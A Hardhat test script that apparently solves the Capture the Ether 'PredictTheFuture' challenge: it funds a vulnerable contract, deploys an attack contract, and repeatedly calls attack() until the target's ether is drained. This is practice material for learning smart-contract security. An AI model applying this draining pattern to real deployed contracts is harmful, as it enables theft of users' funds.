import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let attackContract: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let exploiter: SignerWithAddress;

  before(async () => {
    [exploiter, attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();
    target = target.connect(attacker);

    attackContract = await (
      await ethers.getContractFactory('AttackPredictTheFuture', exploiter)
    ).deploy(target.address);
    await attackContract.deployed();

  });

  it('exploit', async () => {

    await attackContract.lockInGuess(0, {
      value: ethers.utils.parseEther(`1`),
    });
  
    while(!await target.isComplete()) {
      try {
        const tx = await attackContract.attack({
          gasLimit: 1e5,
        });
      } catch (error) {
        console.log(`attack failed with ${error.message}`)
      }
    }
  
    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});